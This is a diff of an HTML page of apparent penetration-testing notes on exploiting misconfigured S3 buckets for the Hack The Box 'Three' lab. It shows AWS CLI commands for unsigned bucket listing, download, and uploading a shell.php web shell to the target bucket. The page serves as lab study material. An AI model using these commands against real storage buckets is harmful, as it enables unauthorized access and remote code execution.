@@ -24,23 +24,24 @@
         </div>
         <div class="notion-body">
             <h2>Exploitation</h2>
-            <h3>⚠️ IMPORTANT </h3>
-            <p> After explotint any bucket you must know that there is a parameter which may be changed </p>
-            <h3> For external buckets (online) </h3>
-            <p> s3 = s3.amazonaws.com </p>
-            <pre><code class="language-bash">aws s3 ...</code></pre>
-            <h3> For internal buckets (HTB, TryHackme...) </h3>
-            <pre><code class="language-bash">aws --endpoint=http://s3.thetoppers.htb ...</code></pre>
-            <h3> List bucket without passwd </h3>
-            <pre><code class="language-bash">aws s3 ls s3://s3.thetoppers.htb --no-sign-request  </code></pre>
-            <h3> List using credentials </h3>
-            <p> Requires the creation of a user and the modification of policies and configuration of keys. (aws configure) <a class="notion-link" href="https://www.youtube.com/watch?v=0kk6k-VdllM&t=939s"> Example </a>
-            <pre><code class="language-bash">aws --endpoint=http://s3.thetoppers.htb --profile=test s3 ls s3://thetoppers.htb  </code></pre>
-            <h3> Download using credentials </h3>
-            <pre><code class="language-bash">aws --endpoint=http://s3.thetoppers.htb --profile=test s3 cp s3://thetoppers.htb/index.php index.php  </code></pre>
-            <h3> Upload using credentials </h3>
-            <pre><code class="language-bash">aws --endpoint=http://s3.thetoppers.htb --profile=test s3 cp /home/kali/Desktop/Hackthebox/Starting\ POint/Three/shell.php s3://thetoppers.htb/shell.php  </code></pre>
-
+            <ul>
+                <h3>⚠️ IMPORTANT </h3>
+                <p> After exploiting any bucket you must know that there is a parameter which may be changed </p>
+                <h3> For external buckets (online) </h3>
+                <p> s3 = s3.amazonaws.com </p>
+                <pre><code class="language-bash">aws s3 ...</code></pre>
+                <h3> For internal buckets (HTB, TryHackme...) </h3>
+                <pre><code class="language-bash">aws --endpoint=http://s3.thetoppers.htb ...</code></pre>
+                <h3> List bucket without passwd </h3>
+                <pre><code class="language-bash">aws s3 ls s3://s3.thetoppers.htb --no-sign-request  </code></pre>
+                <h3> List using credentials </h3>
+                <p> Requires the creation of a user and the modification of policies and configuration of keys. (aws configure) <a class="notion-link" href="https://www.youtube.com/watch?v=0kk6k-VdllM&t=939s"> Example </a>
+                <pre><code class="language-bash">aws --endpoint=http://s3.thetoppers.htb --profile=test s3 ls s3://thetoppers.htb  </code></pre>
+                <h3> Download using credentials </h3>
+                <pre><code class="language-bash">aws --endpoint=http://s3.thetoppers.htb --profile=test s3 cp s3://thetoppers.htb/index.php index.php  </code></pre>
+                <h3> Upload using credentials </h3>
+                <pre><code class="language-bash">aws --endpoint=http://s3.thetoppers.htb --profile=test s3 cp /home/kali/Desktop/Hackthebox/Starting\ POint/Three/shell.php s3://thetoppers.htb/shell.php  </code></pre>
+            </ul>    
             
 
 
